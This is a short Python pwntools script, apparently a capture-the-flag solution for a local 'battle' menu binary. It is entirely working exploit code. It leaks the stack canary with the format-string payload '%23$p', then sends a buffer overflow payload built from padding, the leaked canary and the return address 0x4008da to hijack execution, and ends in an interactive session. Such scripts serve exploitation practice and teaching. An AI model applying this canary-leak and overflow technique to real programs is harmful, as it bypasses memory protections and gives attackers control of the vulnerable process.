from pwn import *

io = process('./22e2d7579d2d4359a5a1735edddef631')

payload1 = b'%23$p'

def fmtstr(payload):
    print(io.recvuntil(b'3. Exit the battle'))
    print(io.recv())
    io.sendline(b'2')
    io.send(payload)


def bof(payload):
    print(io.recvuntil(b'3. Exit the battle'))
    print(io.recv())
    pause()
    io.sendline(b'1')
    io.send(payload)


fmtstr(payload1)
canary = int(io.recv(18), 16)

print(hex(canary))

payload2 = b'A'*136+p64(canary)+b'A'*8+p64(0x4008da)
bof(payload2)
print(io.recvall())
io.interactive()
